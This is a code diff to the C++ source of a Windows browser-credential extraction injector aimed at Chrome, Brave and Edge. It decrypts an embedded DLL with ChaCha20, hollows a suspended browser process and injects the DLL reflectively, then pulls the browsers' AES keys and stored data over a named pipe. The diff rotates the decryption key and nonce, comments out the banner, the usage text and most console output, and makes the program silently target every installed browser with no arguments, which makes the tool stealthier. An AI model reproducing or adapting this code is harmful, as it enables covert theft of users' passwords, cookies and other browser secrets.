@@ -38,15 +38,14 @@ namespace
     constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
     constexpr const char *APP_VERSION = "v0.15.0";
 
-    const uint8_t g_decryptionKey[32] = {
-        0x1B, 0x27, 0x55, 0x64, 0x73, 0x8B, 0x9F, 0x4D,
-        0x58, 0x4A, 0x7D, 0x67, 0x8C, 0x79, 0x77, 0x46,
-        0xBE, 0x6B, 0x4E, 0x0C, 0x54, 0x57, 0xCD, 0x95,
-        0x18, 0xDE, 0x7E, 0x21, 0x47, 0x66, 0x7C, 0x94};
+    const uint8_t theKey[32] = {
+        0x3b, 0x15, 0xe7, 0xea, 0x46, 0x7f, 0x7d, 0x5d, 
+        0x33, 0xd9, 0x51, 0xe3, 0xc9, 0x6c, 0x5d, 0x1d, 
+        0xa4, 0x95, 0x28, 0x47, 0xa1, 0xb7, 0xb2, 0x6d, 
+        0x14, 0x93, 0x1e, 0x4e, 0xed, 0x2, 0x68, 0xa3};
 
-    const uint8_t g_decryptionNonce[12] = {
-        0x4A, 0x51, 0x78, 0x62, 0x8D, 0x2D, 0x4A, 0x54,
-        0x88, 0xE5, 0x3C, 0x50};
+    const uint8_t theNonce[12] = {
+       0x3a, 0xc4, 0x29, 0xdc, 0xfd, 0xed, 0xca, 0x35, 0x0, 0x2, 0x82, 0x51};
 
     namespace fs = std::filesystem;
 
@@ -118,37 +117,37 @@ public:
         m_originalAttributes = consoleInfo.wAttributes;
     }
 
-    void displayBanner() const
-    {
-        SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
-        std::cout << "_________ .__                         ___________.__                       __                \n"
-                  << "\\_   ___ \\|  |_________  ____   _____ \\_   _____/|  |   _______  _______ _/  |_  ___________ \n"
-                  << "/    \\  \\/|  |  \\_  __ \\/  _ \\ /     \\ |    __)_ |  | _/ __ \\  \\/ /\\__  \\\\   __\\/  _ \\_  __ \\\n"
-                  << "\\     \\___|   Y  \\  | \\(  <_> )  Y Y  \\|        \\|  |_\\  ___/\\   /  / __ \\|  | (  <_> )  | \\/\n"
-                  << " \\______  /___|  /__|   \\____/|__|_|  /_______  /|____/\\___  >\\_/  (____  /__|  \\____/|__|   \n"
-                  << "        \\/     \\/                   \\/        \\/           \\/           \\/                   \n\n"
-                  << " Direct Syscall-Based Reflective Hollowing\n"
-                  << " x64 & ARM64 | " << APP_VERSION << " by @xaitax"
-                  << "\n\n";
-        ResetColor();
-    }
+    // void displayBanner() const
+    // {
+    //     SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    //     std::cout << "_________ .__                         ___________.__                       __                \n"
+    //               << "\\_   ___ \\|  |_________  ____   _____ \\_   _____/|  |   _______  _______ _/  |_  ___________ \n"
+    //               << "/    \\  \\/|  |  \\_  __ \\/  _ \\ /     \\ |    __)_ |  | _/ __ \\  \\/ /\\__  \\\\   __\\/  _ \\_  __ \\\n"
+    //               << "\\     \\___|   Y  \\  | \\(  <_> )  Y Y  \\|        \\|  |_\\  ___/\\   /  / __ \\|  | (  <_> )  | \\/\n"
+    //               << " \\______  /___|  /__|   \\____/|__|_|  /_______  /|____/\\___  >\\_/  (____  /__|  \\____/|__|   \n"
+    //               << "        \\/     \\/                   \\/        \\/           \\/           \\/                   \n\n"
+    //               << " Direct Syscall-Based Reflective Hollowing\n"
+    //               << " x64 & ARM64 | " << APP_VERSION << " by @xaitax"
+    //               << "\n\n";
+    //     ResetColor();
+    // }
 
-    void printUsage() const
-    {
-        SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-        std::wcout << L"Usage:\n"
-                   << L"  chrome_inject.exe [options] <chrome|brave|edge|all>\n\n"
-                   << L"Options:\n"
-                   << L"  --output-path|-o <path>  Directory for output files (default: .\\output\\)\n"
-                   << L"  --verbose|-v             Enable verbose debug output from the injector\n"
-                   << L"  --help|-h                Show this help message\n\n"
-                   << L"Browser targets:\n"
-                   << L"  chrome  - Extract from Google Chrome\n"
-                   << L"  brave   - Extract from Brave Browser\n"
-                   << L"  edge    - Extract from Microsoft Edge\n"
-                   << L"  all     - Extract from all installed browsers\n";
-        ResetColor();
-    }
+    // void printUsage() const
+    // {
+    //     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+    //     std::wcout << L"Usage:\n"
+    //                << L"  chrome_inject.exe [options] <chrome|brave|edge|all>\n\n"
+    //                << L"Options:\n"
+    //                << L"  --output-path|-o <path>  Directory for output files (default: .\\output\\)\n"
+    //                << L"  --verbose|-v             Enable verbose debug output from the injector\n"
+    //                << L"  --help|-h                Show this help message\n\n"
+    //                << L"Browser targets:\n"
+    //                << L"  chrome  - Extract from Google Chrome\n"
+    //                << L"  brave   - Extract from Brave Browser\n"
+    //                << L"  edge    - Extract from Microsoft Edge\n"
+    //                << L"  all     - Extract from all installed browsers\n";
+    //     ResetColor();
+    // }
 
     void Info(const std::string &msg) const { print("[*]", msg, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
     void Success(const std::string &msg) const { print("[+]", msg, FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
@@ -180,9 +179,9 @@ public:
                 color = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
 
             SetColor(color);
-            std::cout << tag;
+            //std::cout << tag;
             ResetColor();
-            std::cout << message.substr(tagEnd + 1) << std::endl;
+            // std::cout << message.substr(tagEnd + 1) << std::endl;
         }
         else
         {
@@ -361,7 +360,7 @@ struct Configuration
                 customOutputPath = argv[++i];
             else if (arg == L"--help" || arg == L"-h")
             {
-                console.printUsage();
+                // console.printUsage();
                 return std::nullopt;
             }
             else if (config.browserType.empty() && !arg.empty() && arg[0] != L'-')
@@ -375,7 +374,7 @@ struct Configuration
 
         if (config.browserType.empty())
         {
-            console.printUsage();
+            // console.printUsage();
             return std::nullopt;
         }
 
@@ -400,8 +399,8 @@ struct Configuration
 
         if (config.browserDefaultExePath.empty())
         {
-            console.Error("Could not find " + Utils::WStringToUtf8(config.browserType) + " installation in Registry");
-            console.Info("Please ensure " + Utils::WStringToUtf8(config.browserType) + " is properly installed");
+            // console.Error("Could not find " + Utils::WStringToUtf8(config.browserType) + " installation in Registry");
+            // console.Info("Please ensure " + Utils::WStringToUtf8(config.browserType) + " is properly installed");
             return std::nullopt;
         }
 
@@ -595,6 +594,7 @@ public:
                 }
 
                 parseExtractionMessage(message);
+                // m_console.Info("");
 
                 if (!message.empty() && m_console.m_verbose)
                     m_console.Relay(message);
@@ -740,7 +740,7 @@ private:
             throw std::runtime_error("LockResource or SizeofResource failed.");
 
         m_decryptedDllPayload.assign((BYTE *)pData, (BYTE *)pData + dwSize);
-        chacha20_xor(g_decryptionKey, g_decryptionNonce, m_decryptedDllPayload.data(), m_decryptedDllPayload.size(), 0);
+        chacha20_xor(theKey, theNonce, m_decryptedDllPayload.data(), m_decryptedDllPayload.size(), 0);
     }
 
     DWORD getReflectiveLoaderOffset()
@@ -903,17 +903,21 @@ PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration &conf
 {
     KillBrowserNetworkService(config, console);
 
+
     TargetProcess target(config, console);
     target.createSuspended();
-
+    
     PipeCommunicator pipe(Utils::GenerateUniquePipeName(), console);
     pipe.create();
-
+    
     InjectionManager injector(target, console);
+
     injector.execute(pipe.getName());
 
     pipe.waitForClient();
+    console.Info("");
     pipe.sendInitialData(config.verbose, config.outputPath);
+
     pipe.relayMessages();
 
     target.terminate();
@@ -921,64 +925,65 @@ PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration &conf
     return pipe.getStats();
 }
 
-void DisplayExtractionSummary(const std::string &browserName, const PipeCommunicator::ExtractionStats &stats,
-                              const Console &console, bool singleBrowser, const fs::path &outputPath)
-{
-    if (singleBrowser)
-    {
-        if (!stats.aesKey.empty())
-            console.Success("AES Key: " + stats.aesKey);
+// void DisplayExtractionSummary(const std::string &browserName, const PipeCommunicator::ExtractionStats &stats,
+//                               const Console &console, bool singleBrowser, const fs::path &outputPath)
+// {
+//     if (singleBrowser)
+//     {
+//         if (!stats.aesKey.empty())
+//             console.Success("AES Key: " + stats.aesKey);
 
-        std::string summary = BuildExtractionSummary(stats);
-        if (!summary.empty())
-        {
-            console.Success(summary);
-            console.Success("Stored in " + (outputPath / browserName).u8string());
-        }
-        else
-        {
-            console.Warn("No data extracted");
-        }
-    }
-    else
-    {
-        console.Info(browserName);
+//         std::string summary = BuildExtractionSummary(stats);
+//         if (!summary.empty())
+//         {
+//             console.Success(summary);
+//             console.Success("Stored in " + (outputPath / browserName).u8string());
+//         }
+//         else
+//         {
+//             console.Warn("No data extracted");
+//         }
+//     }
+//     else
+//     {
+//         console.Info(browserName);
 
-        if (!stats.aesKey.empty())
-            console.Success("AES Key: " + stats.aesKey);
+//         if (!stats.aesKey.empty())
+//             console.Success("AES Key: " + stats.aesKey);
 
-        std::string summary = BuildExtractionSummary(stats);
-        if (!summary.empty())
-        {
-            console.Success(summary);
-            console.Success("Stored in " + (outputPath / browserName).u8string());
-        }
-        else
-        {
-            console.Warn("No data extracted");
-        }
-    }
-}
+//         std::string summary = BuildExtractionSummary(stats);
+//         if (!summary.empty())
+//         {
+//             console.Success(summary);
+//             console.Success("Stored in " + (outputPath / browserName).u8string());
+//         }
+//         else
+//         {
+//             console.Warn("No data extracted");
+//         }
+//     }
+// }
 
 void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &outputPath)
 {
-    if (verbose)
-        console.Info("Starting multi-browser extraction...");
+    // if (verbose)
+    //     console.Info("Starting multi-browser extraction...");
 
     BrowserPathResolver resolver(console);
     auto installedBrowsers = resolver.findAllInstalledBrowsers();
 
     if (installedBrowsers.empty())
     {
-        console.Error("No supported browsers found on this system");
+       // console.Error("No supported browsers found on this system");
         return;
     }
 
-    if (!verbose)
-        console.Info("Processing " + std::to_string(installedBrowsers.size()) + " browser(s):\n");
+    // if (!verbose)
+    //     console.Info("Processing " + std::to_string(installedBrowsers.size()) + " browser(s):\n");
 
     int successCount = 0;
     int failCount = 0;
+
 
     for (size_t i = 0; i < installedBrowsers.size(); ++i)
     {
@@ -1003,27 +1008,28 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
             config.browserDisplayName = it->second.second;
         }
 
-        if (verbose)
-        {
-            console.Info("\n[Browser " + std::to_string(i + 1) + "/" + std::to_string(installedBrowsers.size()) +
-                         "] Processing " + config.browserDisplayName);
-        }
+        // if (verbose)
+        // {
+        //     console.Info("\n[Browser " + std::to_string(i + 1) + "/" + std::to_string(installedBrowsers.size()) +
+        //                  "] Processing " + config.browserDisplayName);
+        // }
 
         try
-        {
+        {   
+            //console.Info("before injection");
             auto stats = RunInjectionWorkflow(config, console);
             successCount++;
-
-            if (verbose)
-            {
-                console.Success(config.browserDisplayName + " extraction completed");
-            }
-            else
-            {
-                DisplayExtractionSummary(config.browserDisplayName, stats, console, false, config.outputPath);
-                if (i < installedBrowsers.size() - 1)
-                    std::cout << std::endl;
-            }
+            //console.Info("after injection");
+            // if (verbose)
+            // {
+            //     console.Success(config.browserDisplayName + " extraction completed");
+            // }
+            // else
+            // {
+            //     DisplayExtractionSummary(config.browserDisplayName, stats, console, false, config.outputPath);
+            //     if (i < installedBrowsers.size() - 1)
+            //         std::cout << std::endl;
+            // }
         }
         catch (const std::exception &e)
         {
@@ -1031,12 +1037,12 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
 
             if (verbose)
             {
-                console.Error(config.browserDisplayName + " extraction failed: " + std::string(e.what()));
+                // console.Error(config.browserDisplayName + " extraction failed: " + std::string(e.what()));
             }
             else
             {
-                console.Info(config.browserDisplayName);
-                console.Error("Extraction failed");
+                //console.Info(config.browserDisplayName);
+               // console.Error("Extraction failed");
                 if (i < installedBrowsers.size() - 1)
                     std::cout << std::endl;
             }
@@ -1044,7 +1050,7 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
     }
 
     std::cout << std::endl;
-    console.Info("Completed: " + std::to_string(successCount) + " successful, " + std::to_string(failCount) + " failed");
+    //console.Info("Completed: " + std::to_string(successCount) + " successful, " + std::to_string(failCount) + " failed");
 }
 
 int wmain(int argc, wchar_t *argv[])
@@ -1053,32 +1059,8 @@ int wmain(int argc, wchar_t *argv[])
     std::wstring browserTarget;
     fs::path outputPath;
 
-    // Parse arguments
-    for (int i = 1; i < argc; ++i)
-    {
-        std::wstring_view arg = argv[i];
-        if (arg == L"--verbose" || arg == L"-v")
-            isVerbose = true;
-        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
-            outputPath = argv[++i];
-        else if (arg == L"--help" || arg == L"-h")
-        {
-            Console(false).displayBanner();
-            Console(false).printUsage();
-            return 0;
-        }
-        else if (browserTarget.empty() && !arg.empty() && arg[0] != L'-')
-            browserTarget = arg;
-    }
 
     Console console(isVerbose);
-    console.displayBanner();
-
-    if (browserTarget.empty())
-    {
-        console.printUsage();
-        return 0;
-    }
 
     if (!InitializeSyscalls(isVerbose))
     {
@@ -1097,9 +1079,7 @@ int wmain(int argc, wchar_t *argv[])
         return 1;
     }
 
-    if (browserTarget == L"all")
-    {
-        try
+    try
         {
             ProcessAllBrowsers(console, isVerbose, outputPath);
         }
@@ -1108,32 +1088,7 @@ int wmain(int argc, wchar_t *argv[])
             console.Error(e.what());
             return 1;
         }
-    }
-    else
-    {
-        auto optConfig = Configuration::CreateFromArgs(argc, argv, console);
-        if (!optConfig)
-            return 1;
 
-        try
-        {
-            if (!isVerbose)
-                console.Info("Processing " + optConfig->browserDisplayName + "...\n");
-
-            auto stats = RunInjectionWorkflow(*optConfig, console);
-
-            if (!isVerbose)
-                DisplayExtractionSummary(optConfig->browserDisplayName, stats, console, true, optConfig->outputPath);
-            else
-                console.Success("\nExtraction completed successfully");
-        }
-        catch (const std::runtime_error &e)
-        {
-            console.Error(e.what());
-            return 1;
-        }
-    }
-
-    console.Debug("Injector finished successfully.");
+    // console.Debug("Injector finished successfully.");
     return 0;
 }
